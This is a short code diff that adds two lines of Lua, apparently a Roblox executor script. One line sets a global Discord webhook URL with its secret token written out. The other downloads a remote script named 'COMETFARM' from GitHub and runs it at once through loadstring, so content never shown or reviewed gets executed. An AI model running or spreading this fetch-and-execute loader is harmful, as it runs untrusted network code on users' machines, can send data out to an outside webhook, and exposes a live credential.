@@ -1,0 +1,2 @@
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1099656447337447494/lsADYjqfWeMYHFtGCEt04Xdjl_FryELo9YuBSf7Z7_z6TLdiZf_LV9S8DijWvaXBqNSh"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/Scripts2023/main/COMETFARM"))()
